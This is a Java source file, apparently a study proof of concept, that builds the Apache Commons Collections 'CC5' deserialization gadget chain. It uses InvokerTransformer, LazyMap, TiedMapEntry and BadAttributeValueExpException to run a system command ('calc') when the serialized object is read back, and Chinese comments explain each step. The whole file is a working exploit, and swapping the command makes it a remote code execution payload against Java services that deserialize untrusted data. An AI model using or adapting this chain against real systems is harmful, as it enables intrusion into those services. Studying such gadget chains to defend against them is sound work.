
/**
 * 需要使得security manager==null才可以成功(BadAttributeValueExpException类中的if判断限制)
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CC5 {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args)throws Exception {
        //创建 ChainedTransformer实例
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc" }),
            new ConstantTransformer(1)
        };
        ChainedTransformer chain = new ChainedTransformer(fakeTransformers);
        //创建 LazyMap 实例
        HashMap innermap = new HashMap();
        Map lazymap = LazyMap.decorate(innermap,chain);

        //创建 TiedMapEntry 实例
        TiedMapEntry tme = new TiedMapEntry(lazymap,"RoboTerh");
        // 创建BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //修改chain 的iTransformers 属性为恶意transformers
        setFieldValue(chain,"iTransformers",transformers);
        //修改badAttributeValueExpException 的val 属性为 tme
        setFieldValue(badAttributeValueExpException,"val",tme);


        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(badAttributeValueExpException);
        oos.close();
        System.out.println(baor);

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
